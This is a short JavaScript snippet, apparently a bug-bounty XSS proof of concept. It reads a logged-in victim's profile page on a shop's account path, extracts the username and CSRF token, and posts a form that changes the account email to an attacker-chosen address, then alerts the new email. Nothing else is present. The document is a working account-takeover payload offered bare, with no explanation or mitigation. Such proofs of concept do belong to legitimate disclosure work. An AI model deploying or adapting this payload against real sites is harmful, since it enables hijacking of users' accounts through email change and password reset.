var xhr = new XMLHttpRequest();
xhr.open('GET', '/DE/de/hob/my-account/profile', true);
xhr.withCredentials = true;
xhr.onload = function() {
  var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
  var username = doc.querySelector('#login\\.identifier\\.placeholder\\.hoffmann').value;
  var csrf = doc.querySelector('[name="CSRFToken"]').value;
var email=`vampire01%2b${Math.floor((Math.random() * 10000) + 1)}@intigrit.com`;
  const post = new XMLHttpRequest();
  post.open('POST', '/DE/de/hob/my-account/profile', true);
  post.withCredentials = true;
  post.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  post.onload = function() { alert(`Your Email Changed to: ${decodeURIComponent(email)}`); };
  post.send(`customerUid=${username}&pwd=&newPwd=&checkNewPassword=&title=mr&firstName=t&lastName=t&email=${email}&phone=64564565&phoneCountry=DE&CSRFToken=${csrf}`);
};
xhr.send();
